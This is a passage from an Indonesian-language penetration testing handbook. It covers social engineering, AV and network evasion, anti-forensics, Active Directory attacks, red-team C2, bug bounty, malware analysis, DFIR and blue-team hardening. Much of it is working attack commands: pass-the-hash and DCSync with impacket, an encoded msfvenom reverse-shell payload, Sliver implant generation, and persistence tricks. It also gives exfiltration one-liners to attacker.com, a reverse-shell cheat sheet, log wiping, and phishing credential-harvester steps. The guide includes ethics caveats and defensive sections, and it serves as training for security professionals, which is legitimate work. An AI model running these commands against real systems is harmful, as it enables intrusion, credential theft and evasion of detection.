impacket-psexec -hashes LMHASH:NTHASH administrator@10.10.10.5
impacket-wmiexec -hashes :NTHASH administrator@10.10.10.5
```

### 16. Social Engineering

**Prinsip: Manipulasi manusia, bukan sistem.**

**Teknik umum:**
1. **Phishing**: Email palsu mengarah ke login page fake (GoPhish, SET).
2. **Vishing**: Phone call, pura-pura IT support.
3. **Smishing**: SMS berisi link malicious.
4. **Pretexting**: Identitas palsu (vendor, auditor, eksekutif).
5. **Baiting**: USB flash drive ditinggalkan di area target (USB drop attack).
6. **Tailgating**: Ikut masuk gedung di belakang karyawan.

**Tools:**
```bash
# Social-Engineer Toolkit (SET)
sudo setoolkit
# Menu: 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester

# GoPhish (framework phishing profesional)
# Gophish: buat campaign, landing page, email template, track open & click
```

**Contoh SET credential harvester:**
1. Pilih "Website Attack Vectors" → "Credential Harvester".
2. "Site Cloner" → masukkan URL login page target.
3. SET clone page dan listen di port 80.
4. Korban login → credential muncul di terminal SET.

**Catatan etika**: Hanya untuk authorized penetration test dengan scope tertulis. Phishing tanpa izin = penipuan pidana.

### 17. Evasion & Anti-Forensics

**Tujuan: Hindari deteksi saat pentest authorized (red team).**

**AV Evasion:**
```bash
# Encoding payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o evasion.exe

# Veil Framework (deprecated tapi konsepnya sama)
# Modern: use tools seperti: ScareCrow, Donut, PEzor, Shellter

# Obfuscation PowerShell
# AMSI bypass, encoding command, IEX download cradle
powershell -enc <base64_encoded_command>
```

**Network Evasion:**
```bash
# Slow scan (hindari IDS)
nmap -T2 --max-retries 1 -p- 10.10.10.5
nmap -f 10.10.10.5                    # Fragmentasi paket
nmap --mtu 24 10.10.10.5

# Tunneling
ssh -L 8080:target:80 user@jumpbox   # Local port forward
ssh -R 8080:localhost:80 user@vps    # Remote port forward
chisel server -p 8080 --reverse      # Tunnel over HTTP
chisel client 10.10.14.5:8080 R:socks

# DNS tunneling (iodine, dnscat2) — exfiltrate via DNS query
```

**Anti-Forensics (untuk red team engagement — membersihkan jejak):**
```bash
# Linux
history -c && history -w
rm -f ~/.bash_history
shred -u file.txt
# Timestomp: touch -d "2020-01-01 12:00" file.txt

# Windows
# Clear event log: wevtutil cl Security (butuh admin — noisy!)
# Timestomp dengan mimikatz: misc::detours
```

---

## BAGIAN V: TEKNIK LANJUTAN

### 18. Active Directory Attacks

**AD adalah target #1 di enterprise. Fokus: credential → lateral movement → domain admin.**

**Enumeration:**
```bash
# BloodHound (visualisasi attack path)
sudo neo4j start
bloodhound-python -u user -p password -ns 10.10.10.5 -d target.local -c all
# Atau SharpHound.exe (dari Windows)
# Upload data ke BloodHound GUI → analisis graph

# Manual enum dengan netexec
nxc smb 10.10.10.5 -u user -p password --shares
nxc smb 10.10.10.5 -u user -p password --users
nxc smb 10.10.10.5 -u user -p password --groups
nxc smb 10.10.10.5 -u user -p password -M spider_plus   # Enumerate semua file share

# impacket toolkit
impacket-GetADUsers -all target.local/user:password
impacket-GetUserSPNs target.local/user:password          # Kerberoastable accounts
impacket-GetNPUsers target.local/ -usersfile users.txt   # AS-REP roastable
impacket-secretsdump target.local/user:password@10.10.10.5
impacket-lookupsid target.local/user:password@10.10.10.5 # RID cycling
```

**Attack utama:**
1. **Kerberoasting**: Request TGS untuk SPN account → crack hash offline.
   ```bash
   impacket-GetUserSPNs target.local/user:password -request
   hashcat -m 13100 tgs.hash rockyou.txt
   ```
2. **AS-REP Roasting**: User dengan "Do not require Kerberos preauthentication" → crackable.
   ```bash
   impacket-GetNPUsers target.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
   ```
3. **Pass-the-Hash**: Gunakan NTLM hash tanpa crack password.
4. **Pass-the-Ticket**: Curi TGT/TGS dari memory (mimikatz sekurlsa::tickets).
5. **Delegation attacks**: Constrained/Unconstrained delegation → impersonate user ke service lain.
6. **DCSync**: Simulate DC, request password hash semua user (butuh replication rights).
   ```bash
   impacket-secretsdump target.local/admin:password@10.10.10.5 -just-dc
   ```
7. **Golden Ticket**: Forge TGT dengan krbtgt hash → akses eternal sampai password krbtgt diubah 2x.
8. **Silver Ticket**: Forge TGS untuk service spesifik.
9. **ACL Abuse**: WriteDacl, WriteOwner, GenericAll → tambah user ke group admin.
10. **GPO Abuse**: Edit Group Policy → deploy malware/scheduled task ke seluruh domain.

**Lateral Movement:**
```bash
# Dengan crackmapexec/netexec
nxc smb 10.10.10.0/24 -u admin -p password -x "whoami"   # Execute command via SMB
nxc winrm 10.10.10.0/24 -u admin -p password -x "whoami"

# PSExec (impacket)
impacket-psexec target.local/admin:password@10.10.10.6
impacket-wmiexec target.local/admin:password@10.10.10.6
impacket-atexec target.local/admin:password@10.10.10.6 "cmd /c whoami"

# WinRM
evil-winrm -i 10.10.10.6 -u admin -p password
```

### 19. Red Team Tactics

**Red team = simulasi adversary advanced persistent threat (APT) dengan tujuan menguji deteksi & respon blue team.**

**Command & Control (C2):**
- **Cobalt Strike**: Standar industri red team (berbayar, mahal). Malleable C2 profile, Beacon payload.
- **Metasploit**: Gratis, cocok untuk pemula-menengah.
- **Sliver**: Open-source C2 modern (Go). Gratis, actively maintained.
- **Havoc**: Open-source C2 modern (C/C++), mirip Cobalt Strike.
- **Mythic**: Open-source, modular, Python/Go.

**Contoh Sliver (C2 open source):**
```bash
# Server (attacker)
sliver-server
sliver > generate --http 10.10.14.5:80 --save /tmp/implant.exe
sliver > http
sliver > use <session-id>
sliver > execute -o whoami

# Implant di target connect back → session established
```

**Lateral Movement techniques:**
- **WMI/WinRM/PSExec**: Remote execution (lihat bagian AD).
- **RDP hijacking**: tscon.exe dengan SYSTEM session.
- **Pass-the-hash/ticket**: Reuse credential.
- **Overpass-the-hash**: NTLM hash → Kerberos ticket.
- **DCOM**: Execute via Distributed COM (MMC20.Application).

**Persistence (maintain access):**
- Registry run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
- Scheduled Task: `schtasks /create /sc onlogon /tn "Update" /tr "C:\path\implant.exe"`.
- Service: Create Windows service running payload.
- Web shell: shell.php di web server.
- Golden ticket (AD).
- SSH key: Tambah authorized_keys di Linux.
- Cron job: `@reboot /path/to/implant`.
- DLL hijacking/sideloading.
- **Note**: Persistence hanya untuk engagement dengan scope jelas; selalu dokumentasikan dan bersihkan setelah selesai.

**Exfiltration:**
```bash
# DNS exfiltration
cat secret.txt | xxd -p -c 16 | while read line; do dig $line.exfil.attacker.com; done

# HTTPS exfiltration (blend dengan traffic normal)
curl -X POST -d @secret.txt https://attacker.com/collect

# Cloud: AWS S3, Google Drive, Dropbox API
```

### 20. Bug Bounty Methodology

**Platform: HackerOne, Bugcrowd, Intigriti, YesWeHack.**

**Alur bug bounty profesional:**
1. **Pilih target**: Program dengan scope luas, banyak subdomain, baru launch (less competition).
2. **Recon massal**: 
   ```bash
   # Subdomain enumeration
   amass enum -passive -d target.com -o subs.txt
   subfinder -d target.com -o subs2.txt
   cat subs*.txt | sort -u | httpx -o live.txt
   ```
3. **Content discovery**:
   ```bash
   cat live.txt | xargs -I{} gobuster dir -u {} -w wordlist.txt -x php,html,txt,bak
   nuclei -l live.txt -t exposures/ -t misconfiguration/
   ```
4. **Fokus area berisiko tinggi**:
   - API endpoints (`/api/v1/`, GraphQL).
   - Authentication & password reset flow.
   - File upload functionality.
   - Admin panels.
   - Third-party integrations (OAuth, payment callback).
   - Mobile app API (decompile APK, lihat endpoint).
5. **Manual testing**: Burp Suite aktif, uji setiap parameter.
6. **Report**: 
   - Title: clear, impact-driven.
   - Step to reproduce: numbered, detail.
   - Proof of Concept: video/screenshot.
   - Impact: apa yang bisa dilakukan attacker.
   - Severity: gunakan CVSS calculator.

**Bug yang sering ditemukan:**
- IDOR (paling umum, impact tinggi, gampang di-overlook).
- XSS stored (di profile, comment, support ticket).
- SSRF (di webhook, URL fetcher, PDF generator).
- Business logic flaw (negative quantity, price manipulation, race condition).
- Information disclosure (.git exposure, .env, API key di JS bundle).
- Account takeover (via password reset token leak, Host header injection).

**Referensi methodology:**
- "Bug Bounty Bootcamp" (Vickie Li).
- HackerOne Hacktivity (baca report publik).
- PortSwigger Web Security Academy (gratis).

### 21. Malware Analysis Dasar

**Hanya analisis di lab terisolasi (VM tanpa network bridge, snapshot sebelum analisis)!**

**Static Analysis (tanpa menjalankan):**
```bash
# Identifikasi file
file suspicious.exe
sha256sum suspicious.exe
md5sum suspicious.exe

# String extraction
strings suspicious.exe | grep -i "http\|cmd\|password\|key"

# PE header analysis (Windows executable)
peframe suspicious.exe
pecheck suspicious.exe

# Packers
upx -d suspicious.exe          # Unpack UPX
# Cek entropy tinggi = kemungkinan packed/encrypted

# Disassembly
objdump -d suspicious.exe
radare2 -A suspicious.exe      # r2: aaa → afl → pdf @main
ghidra                         # GUI, decompile ke C-like pseudocode
```

**Dynamic Analysis (jalankan di sandbox):**
```bash
# Monitoring dengan Process Monitor (Procmon), Process Explorer, Regshot
# Network monitoring: Wireshark, FakeNet-NG, INetSim

# Linux strace/ltrace
strace -f ./suspicious 2>&1 | tee strace.log
ltrace ./suspicious

# Sandbox online: VirusTotal, Any.Run, Hybrid Analysis, Joe Sandbox
```

**Yara rule (deteksi pola):**
```yara
rule SuspiciousString {
    strings:
        $a = "http://malicious.com/c2" nocase
        $b = "CreateRemoteThread"
    condition:
        any of them
}
```

### 22. DFIR (Digital Forensics & Incident Response)

**Forensik: Mengumpulkan bukti digital untuk investigasi hukum.**

**Prosedur standar:**
1. **Identifikasi**: Apa yang terjadi? Kapan? Sistem apa yang terlibat?
2. **Preservasi**: Image disk/memori sebelum analisis. Jangan ubah bukti.
3. **Collection**: Buat forensic image (bit-by-bit copy).
4. **Analysis**: Cari artifacts, timeline, file recovery.
5. **Reporting**: Dokumentasikan dengan chain of custody.

**Tools:**
```bash
# Memory forensics (Volatility 3)
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.netscan
volatility3 -f memory.dmp windows.malfind          # Injected code
volatility3 -f memory.dmp windows.cmdline
volatility3 -f memory.dmp windows.hashdump

# Disk forensics
autopsy                                        # GUI
tsk_recover -i raw disk.img recovered/         # Sleuth Kit: recover deleted file
photorec                                      # Recover file (cross-platform)
extundelete /dev/sda1 --restore-all            # Ext filesystem undelete

# Timeline analysis
log2timeline.py disk.plaso image.E01
psort.py -o l2tcsv -w timeline.csv disk.plaso

# Network forensics
wireshark capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```

**Windows artifacts penting:**
- Registry hives: SAM, SYSTEM, SOFTWARE, NTUSER.DAT.
- Event logs: `C:\Windows\System32\winevt\Logs\`.
- Prefetch: `C:\Windows\Prefetch\` (program execution evidence).
- $MFT (Master File Table): metadata semua file.
- USN Journal: perubahan file.
- Shimcache/AppCompatCache: program yang pernah dijalankan.
- Browser history: Chrome `History` SQLite DB.

---

## BAGIAN VI: PERTAHANAN (BLUE TEAM)

### 23. Hardening & Defensive

**Linux hardening:**
```bash
# Update & patch
apt update && apt upgrade -y

# SSH hardening (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no        # Hanya key-based
AllowUsers admin                 # Whitelist user
Port 2222                        # Non-default port (security through obscurity, tapi mengurangi noise)

# Firewall
ufw enable
ufw default deny incoming
ufw allow 2222/tcp
ufw allow 80/tcp
ufw allow 443/tcp

# Fail2ban (ban IP setelah brute force)
apt install fail2ban
# Konfigurasi /etc/fail2ban/jail.local: bantime, maxretry, backend

# Audit
lynis audit system                 # Security auditing tool
```

**Web hardening:**
- Parameterized query / prepared statement (cegah SQLi).
- Output encoding + CSP (Content Security Policy) untuk XSS.
- Validasi input server-side.
- WAF (ModSecurity, Cloudflare).
- HTTPS everywhere (HSTS).
- Security headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Content-Security-Policy.
- Least privilege untuk DB user.
- Rate limiting.

### 24. SIEM & Monitoring

**SIEM (Security Information and Event Management):**
- **Splunk**: Enterprise, powerful, mahal.
- **ELK Stack (Elasticsearch, Logstash, Kibana)**: Open source, populer.
- **Wazuh**: Open source XDR/SIEM (fork OSSEC). Gratis, bagus untuk pemula.
- **Graylog**: Open source log management.
- **Sigma**: Generic signature format untuk log analysis.

**Monitoring:**
```bash
# Sysmon (Windows) — log detail process, network, file
# Install Sysmon dengan config SwiftOnSecurity

# osquery — query sistem seperti database SQL
osqueryi "SELECT * FROM processes WHERE name LIKE '%malware%';"

# Auditd (Linux)
auditctl -w /etc/passwd -p wa -k passwd_change
ausearch -k passwd_change
```

**Deteksi IOC (Indicators of Compromise):**
- Network: beaconing periodik, DNS tunneling, unusual port.
- Host: process aneh, persistence mechanism, log tampering.
- File: hash known-malware, entropy tinggi, timestomp.

### 25. Incident Response

**Fase IR (NIST SP 800-61):**
1. **Preparation**: Playbook, tooling, training, backup.
2. **Detection & Analysis**: Alert triage, scope determination.
3. **Containment**: Isolate infected host (disconnect network, block IP).
4. **Eradication**: Remove malware, patch vulnerability, reset credential.
5. **Recovery**: Restore dari backup, monitor anomali.
6. **Post-Incident**: Lessons learned, update defense.

**IR checklist praktis:**
```
[ ] Verifikasi alert (false positive?)
[ ] Tentukan scope: berapa host, user, data terdampak
[ ] Preserve evidence: memory dump, disk image, logs
[ ] Contain: isolate host, disable account, block IOC
[ ] Eradicate: kill process, delete persistence, patch
[ ] Recover: restore service, monitor
[ ] Report: timeline, root cause, recommendation
```

---

## BAGIAN VII: KARIER & REFERENSI

### 26. Roadmap Profesional

**Level 1: Pemula (0-6 bulan)**
- Linux, networking, Python/Bash.
- THM: Pre-Security, Complete Beginner path.
- eJPT (INE) — sertifikasi entry-level.

**Level 2: Menengah (6-18 bulan)**
- Web hacking (PortSwigger Academy — selesaikan semua lab).
- AD basics, privesc.
- PNPT (TCM Security) atau OSCP (OffSec) — sertifikasi hands-on terbaik.
- Bug bounty: mulai dari low-hanging fruit.

**Level 3: Lanjutan (18-36 bulan)**
- Red team ops (Cobalt Strike, C2 development).
- Malware dev & analysis.
- OSEP (advanced pentest), CRTO (red team ops).
- Specialisasi: web, AD, cloud (AWS/Azure/GCP), mobile, OT/ICS.

**Level 4: Expert (3+ tahun)**
- OSED (exploit development).
- Cloud security (CCSP, cloud-specific certs).
- Research, CVE discovery, conference talk.
- Lead red team / purple team.

**Sertifikasi populer:**
| Sertifikasi | Level | Harga | Fokus |
|---|---|---|---|
| CompTIA Security+ | Beginner | ~$400 | Fundamentals |
| eJPT | Beginner | ~$200 | Hands-on pentest |
| CEH | Beginner-Mid | ~$1,200 | Teori + tools |
| PNPT | Mid | ~$300 | AD, hands-on |
| OSCP | Mid | ~$1,600 | Hands-on, 24h exam |
| OSEP | Advanced | ~$1,600 | Evasion, AD |
| CRTO | Advanced | ~$400 | Red team ops |
| CISSP | Advanced | ~$700 | Management |

### 27. Referensi & Cheat Sheet

**Buku wajib:**
- "The Web Application Hacker's Handbook" (Stuttard & Pinto).
- "Penetration Testing" (Georgia Weidman).
- "Metasploit: The Penetration Tester's Guide" (Kennedy et al.).
- "Hacking: The Art of Exploitation" (Jon Erickson).
- "Red Team Field Manual" (RTFM).
- "Blue Team Handbook" (Don Murdoch).
- "Bug Bounty Bootcamp" (Vickie Li).
- "Practical Malware Analysis" (Sikorski & Honig).
- "Active Directory Security" (Sean Metcalf — adsecurity.org).

**Website & resource:**
- OWASP (owasp.org) — Web security standard.
- HackTricks (book.hacktricks.xyz) — Cheat sheet terlengkap.
- PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings).
- GTFOBins (gtfobins.github.io) — SUID/sudo abuse.
- LOLBAS (lolbas-project.github.io) — Living off the land Windows.
- Exploit-DB (exploit-db.com).
- CVE Details (cvedetails.com).
- MITRE ATT&CK (attack.mitre.org) — Adversary tactics & techniques.
- CyberChef (gchq.github.io/CyberChef) — Data analysis swiss knife.
- CrackStation (crackstation.net) — Online hash cracker.
- Have I Been Pwned (haveibeenpwned.com) — Cek breach email.

**Komunitas:**
- Reddit: r/netsec, r/hacking, r/bugbounty, r/oscp.
- Discord: HTB, THM official servers.
- Twitter/X: follow security researchers (jaredcatkinson, _dirkjan, gentilkiwi, etc).

**Cheat sheet cepat:**

```bash
# Reverse shell reference
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
nc -e /bin/sh ATTACKER 4444
python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# TTY upgrade (setelah reverse shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Privesc quick check
sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab; uname -a

# Windows quick win
whoami /priv; systeminfo; net user; net localgroup administrators
```

---

## PENUTUP

**Prinsip terakhir yang tidak boleh dilupakan:**

1. **Izin adalah garis hidup.** Tanpa izin tertulis, Anda adalah penjahat — tidak peduli seberapa skillful Anda.
2. **Dokumentasikan semua.** Screenshot, log, timestamp. Report yang baik = karier yang baik.
3. **Belajar terus menerus.** Security berubah tiap hari. Follow CVE, baca writeup, latihan rutin.
4. **Berbagi ilmu.** Menulis writeup, mentoring, berkontribusi ke komunitas — itu yang membedakan profesional dari script kiddie.
5. **Etika tidak bisa ditawar.** Skill Anda adalah senjata. Gunakan untuk melindungi, bukan merusak.

*"The quieter you become, the more you can hear."* — Ram Dass (motto hacker sejati)

---

**Versi**: 1.0 — 2026
**Platform**: Termux & Kali Linux
**Lisensi**: Untuk edukasi & pertahanan sistem

*Dibuat dengan dedikasi untuk para pembelajar cyber security Indonesia. Gunakan dengan bijak.*
